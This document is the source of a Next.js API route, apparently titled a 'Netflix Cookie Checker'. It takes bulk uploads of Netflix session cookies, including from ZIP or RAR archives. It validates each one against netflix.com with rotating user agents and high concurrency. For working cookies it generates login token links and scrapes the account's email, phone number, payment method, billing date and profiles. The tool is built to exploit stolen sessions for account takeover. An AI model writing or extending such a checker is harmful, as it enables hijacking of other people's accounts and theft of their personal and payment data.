import { NextRequest, NextResponse } from 'next/server';
import { parseMultipleFiles, ParsedCookie } from '@/lib/cookie-parser';
import { scrapeAccountDetails } from '@/lib/netflix-scraper';
import { extractArchive, isArchive } from '@/lib/archive-extractor';

interface CheckResult {
  cookie: ParsedCookie & {
    nftoken?: string;
    nftokenUrl?: string;
  };
  status: 'valid' | 'invalid' | 'expired' | 'error';
  message: string;
  details?: {
    accountName?: string;
    email?: string;
    plan?: string;
    country?: string;
    profiles?: string[];
    nextBilling?: string;
    paymentMethod?: string;
    videoQuality?: string;
    maxStreams?: string;
    memberSince?: string;
    phoneNumber?: string;
    extraMemberSlot?: string;
  };
}

import { generateNFToken } from '@/lib/nftoken-generator';

// EXTENSIVE USER AGENTS LIST - 50+ User Agents for rotation
const USER_AGENTS = [
  // Chrome on Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  
  // Chrome on Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  
  // Chrome on Linux
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  
  // Firefox on Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
  
  // Firefox on Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
  
  // Safari on Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  
  // Safari on iPhone
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  
  // Edge on Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
  
  // Chrome on Android
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  
  // Samsung Internet
  'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36',
];

// Thread-safe user agent rotation
let userAgentIndex = 0;
function getNextUserAgent(): string {
  const index = userAgentIndex % USER_AGENTS.length;
  userAgentIndex++;
  return USER_AGENTS[index];
}

// Build cookie string
function buildCookieString(cookie: ParsedCookie): string {
  return cookie.rawCookie || 
    `NetflixId=${cookie.netflixId}${cookie.secureNetflixId ? `; SecureNetflixId=${cookie.secureNetflixId}` : ''}${cookie.nfvdid ? `; nfvdid=${cookie.nfvdid}` : ''}`;
}

// Fast cookie check - single request validation
async function checkNetflixCookie(cookie: ParsedCookie): Promise<CheckResult> {
  try {
    const cookieString = buildCookieString(cookie);
    const userAgent = getNextUserAgent();
    
    // Single fast check with browse endpoint
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout per request
    
    const response = await fetch('https://www.netflix.com/browse', {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cookie': cookieString,
      },
      redirect: 'manual',
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    const statusCode = response.status;
    const locationHeader = response.headers.get('location') || '';
    
    // Fast checks - no body parsing for speed
    
    // Redirect to login = expired
    if (locationHeader.includes('login') || (statusCode === 302 && locationHeader.includes('login'))) {
      return {
        cookie,
        status: 'expired',
        message: 'Cookie expired',
        details: {
          email: cookie.email,
          plan: cookie.plan,
          country: cookie.country,
        },
      };
    }
    
    // 200 = valid
    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
      // Check for signup redirect (expired)
      if (locationHeader.includes('signup') || (statusCode === 302 && locationHeader.includes('login'))) {
        return {
          cookie,
          status: 'expired',
          message: 'Cookie expired (Signup/Login redirect)',
        };
      }

      // Generate nftoken for valid cookies
      const nftokenResult = await generateNFToken(cookieString);
      const nftoken = nftokenResult.success ? nftokenResult.token : undefined;
      const nftokenUrl = nftokenResult.success ? nftokenResult.link : undefined;
      
      const cookieWithToken = {
          ...cookie,
          nftoken,
          nftokenUrl,
      };

      // Perform deep scraping for all details
      const scraperOptions = {
          method: 'GET',
          headers: {
              'Cookie': cookieString,
              'User-Agent': userAgent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          }
      };
      
      await scrapeAccountDetails(cookieWithToken, scraperOptions);
      
      return {
        cookie: cookieWithToken,
        status: 'valid',
        message: 'Cookie is valid',
        details: {
          email: cookieWithToken.email,
          plan: cookieWithToken.plan,
          country: cookieWithToken.country,
          nextBilling: cookieWithToken.nextBilling,
          paymentMethod: cookieWithToken.paymentMethod,
          videoQuality: cookieWithToken.videoQuality,
          maxStreams: cookieWithToken.maxStreams,
          extraMemberSlot: cookieWithToken.extraMemberSlot,
          memberSince: cookieWithToken.memberSince,
          phoneNumber: cookieWithToken.phoneNumber,
          profiles: cookieWithToken.profiles,
          accountName: cookieWithToken.firstName
        },
      };
    }
    
    // 403 = invalid
    if (statusCode === 403) {
      return {
        cookie,
        status: 'invalid',
        message: 'Access forbidden',
      };
    }
    
    // 401 = expired
    if (statusCode === 401) {
      return {
        cookie,
        status: 'expired',
        message: 'Session expired',
      };
    }
    
    // 302 to signup = expired
    if (statusCode === 302 || statusCode === 301) {
      if (locationHeader.includes('signup') || locationHeader.includes('login')) {
        return {
          cookie,
          status: 'expired',
          message: 'Cookie expired',
        };
      }
      
      // Other redirect might be valid (geo redirect) - generate nftoken
      const nftokenResult = await generateNFToken(cookieString);
      const nftoken = nftokenResult.success ? nftokenResult.token : undefined;
      const nftokenUrl = nftokenResult.success ? nftokenResult.link : undefined;
      
      return {
        cookie: {
          ...cookie,
          nftoken,
          nftokenUrl,
        },
        status: 'valid',
        message: 'Cookie valid (redirect)',
        details: {
          email: cookie.email,
          country: cookie.country,
        },
      };
    }
    
    return {
      cookie,
      status: 'error',
      message: `Status: ${statusCode}`,
    };
  } catch (error) {
    // Timeout or network error
    if (error instanceof Error && error.name === 'AbortError') {
      return {
        cookie,
        status: 'error',
        message: 'Request timeout',
      };
    }
    return {
      cookie,
      status: 'error',
      message: `Error: ${error instanceof Error ? error.message : 'Unknown'}`,
    };
  }
}

// Multi-threaded processing with controlled concurrency
async function processWithConcurrency<T, R>(
  items: T[],
  concurrency: number,
  processor: (item: T) => Promise<R>
): Promise<R[]> {
  const results: R[] = [];
  const executing: Promise<void>[] = [];
  
  for (const item of items) {
    const promise = processor(item).then(result => {
      results.push(result);
    }).then(() => {
      // Remove from executing when done
      const index = executing.indexOf(promise as any);
      if (index > -1) executing.splice(index, 1);
    });
    
    executing.push(promise as any);
    
    // Wait when we reach concurrency limit
    if (executing.length >= concurrency) {
      await Promise.race(executing);
    }
  }
  
  // Wait for all remaining
  await Promise.all(executing);
  
  return results;
}

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData();
    const files = formData.getAll('files') as File[];
    const concurrencyStr = formData.get('concurrency') as string;
    
    // Parse concurrency (default 15)
    const concurrency = Math.min(Math.max(parseInt(concurrencyStr) || 15, 1), 50);
    
    if (!files || files.length === 0) {
      return NextResponse.json(
        { error: 'No files provided' },
        { status: 400 }
      );
    }
    
    // Read all files and extract archives
    const fileContents: { name: string; content: string }[] = [];
    
    for (const file of files) {
      const fileName = file.name.toLowerCase();
      
      // Check if it's an archive (ZIP or RAR)
      if (fileName.endsWith('.zip') || fileName.endsWith('.rar')) {
        try {
          // Read as buffer for archive extraction
          const arrayBuffer = await file.arrayBuffer();
          const buffer = Buffer.from(arrayBuffer);
          
          // Extract files from archive
          const extractedFiles = extractArchive(buffer, file.name);
          
          if (extractedFiles.length === 0) {
            fileContents.push({
              name: file.name,
              content: `Error: No readable text files found in archive`
            });
          } else {
            // Add all extracted files
            for (const extracted of extractedFiles) {
              fileContents.push({
                name: `${file.name}/${extracted.name}`,
                content: extracted.content
              });
            }
          }
        } catch (extractError) {
          console.error(`Archive extraction error for ${file.name}:`, extractError);
          fileContents.push({
            name: file.name,
            content: `Error: Failed to extract archive - ${extractError instanceof Error ? extractError.message : 'Unknown error'}`
          });
        }
      } else {
        // Regular text file
        const content = await file.text();
        fileContents.push({ name: file.name, content });
      }
    }
    
    // Parse cookies
    const { cookies: parsedCookies, parseErrors } = parseMultipleFiles(fileContents);
    
    if (parsedCookies.length === 0) {
      return NextResponse.json({
        success: false,
        message: 'No valid Netflix cookies found',
        parseErrors,
        results: [],
        summary: { total: 0, valid: 0, invalid: 0, expired: 0, errors: 0 },
      });
    }
    
    // MULTI-THREADED PROCESSING with specified concurrency
    const results = await processWithConcurrency(
      parsedCookies,
      concurrency,
      checkNetflixCookie
    );
    
    // Calculate summary
    const summary = {
      total: results.length,
      valid: results.filter(r => r.status === 'valid').length,
      invalid: results.filter(r => r.status === 'invalid').length,
      expired: results.filter(r => r.status === 'expired').length,
      errors: results.filter(r => r.status === 'error').length,
    };
    
    return NextResponse.json({
      success: true,
      message: `Processed ${results.length} cookies with ${concurrency} threads`,
      parseErrors,
      results,
      summary,
      concurrency,
    });
  } catch (error) {
    console.error('Error:', error);
    return NextResponse.json(
      { error: 'Internal server error', message: error instanceof Error ? error.message : 'Unknown' },
      { status: 500 }
    );
  }
}

export async function GET() {
  return NextResponse.json({
    message: 'Netflix Cookie Checker API - Multi-Threaded v3.0',
    usage: 'POST /api/check-cookies with files and optional concurrency parameter',
    defaultConcurrency: 15,
    maxConcurrency: 50,
    features: [
      'Multi-threaded processing',
      'Configurable concurrency (1-50)',
      '10 second timeout per request',
      'Fast response without body parsing',
    ],
  });
}
